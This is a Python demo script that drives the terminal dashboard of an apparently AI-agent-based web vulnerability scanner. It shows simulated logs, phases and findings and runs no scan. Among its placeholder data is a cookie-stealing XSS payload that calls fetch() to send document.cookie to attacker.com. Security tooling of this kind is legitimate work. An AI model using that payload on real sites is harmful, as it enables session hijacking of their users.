#!/usr/bin/env python3
"""
Demo script to showcase the new compact Rich UI
"""
import asyncio
import time
from rich.live import Live
from bugtrace.core.ui import dashboard

async def demo():
    """Run a demo showing all UI features"""
    
    # Set initial state
    dashboard.set_target("example.com")
    dashboard.set_phase("RECON")
    dashboard.current_agent = "ReconAgent"
    dashboard.credits = 8.45
    dashboard.session_cost = 1.55
    dashboard.total_requests = 57
    
    with Live(dashboard, refresh_per_second=4, screen=True) as live:
        # Simulate some activity
        for i in range(20):
            # Add logs
            if i % 3 == 0:
                dashboard.log("Starting visual crawler...", "INFO")
            elif i % 3 == 1:
                dashboard.log("✓ Found 23 forms on target", "SUCCESS")
            elif i % 3 == 2:
                dashboard.log("⚠ WAF detected: Cloudflare", "WARN")
            
            # Update payload
            if i % 2 == 0:
                dashboard.set_current_payload(
                    payload=f"<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
                    vector="input#search",
                    status="⏳ Testing",
                    agent="ExploitAgent"
                )
                dashboard.payloads_tested = 142 + i
                dashboard.payloads_success = 15
                dashboard.payloads_failed = 127 + i
                dashboard.payload_rate = 12.3
            
            # Add findings
            if i == 5:
                dashboard.add_finding("SQL Injection", "/api/users?id=1", "CRITICAL")
            elif i == 8:
                dashboard.add_finding("Reflected XSS", "/search?q=<script>", "HIGH")
            elif i == 12:
                dashboard.add_finding("DOM XSS", "/profile (SkepticalAgent verified)", "HIGH")
            elif i == 15:
                dashboard.add_finding("CORS Misconfiguration", "/api/*", "MEDIUM")
            elif i == 18:
                dashboard.add_finding("Information Disclosure", "/debug", "LOW")
            
            # Simulate phase changes
            if i == 7:
                dashboard.set_phase("ATTACK")
                dashboard.current_agent = "ExploitAgent"
            elif i == 14:
                dashboard.set_phase("VERIFICATION")
                dashboard.current_agent = "SkepticalAgent"
            
            # Update costs
            dashboard.session_cost += 0.05
            dashboard.total_requests += 1
            
            await asyncio.sleep(0.5)
        
        # Final state
        dashboard.set_phase("COMPLETE")
        dashboard.log("🎉 Scan complete! Report generated.", "SUCCESS")
        await asyncio.sleep(5)

if __name__ == "__main__":
    print("🚀 BugtraceAI-CLI UI Demo")
    print("Starting in 2 seconds...")
    time.sleep(2)
    asyncio.run(demo())
